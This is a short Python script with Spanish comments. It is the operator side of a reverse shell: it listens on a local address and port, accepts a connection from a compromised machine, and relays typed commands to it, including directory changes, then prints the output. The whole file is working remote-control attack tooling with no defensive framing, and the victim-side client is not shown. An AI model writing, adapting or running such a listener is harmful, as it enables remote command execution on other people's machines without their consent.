import socket

from pip._vendor.distlib.compat import raw_input


def shell():
    currentDir = target.recv(1024)
    while True:
        comando = raw_input("{}~#: ".format(currentDir.decode()))

        if comando == 'exit':
            target.send(comando.encode())
            break
  #APARTIR DE ACA SE CREAN NUEVAS FUNCIONES
        elif comando[:2] == 'cd' and len(comando) > 3:
            target.send(comando.encode())
            res = target.recv(1024)
            currentDir = res
            
        elif comando == '':
            pass

        else:

            target.send(comando.encode())
            res = target.recv(30000).decode()
            
            
            if res == 'recivido':

                continue
            else:
                print(res)


def upcliente():
    global cliente
    global ip
    global target
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cliente.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    cliente.bind(('192.168.0.103', 4004))
    cliente.listen(1)

    print('cliente a la escucha, esperando conexion')

    target, ip = cliente.accept()
    print('[+]', 'conexion recibida de:', str(ip[0]))

upcliente()
shell()
cliente.close()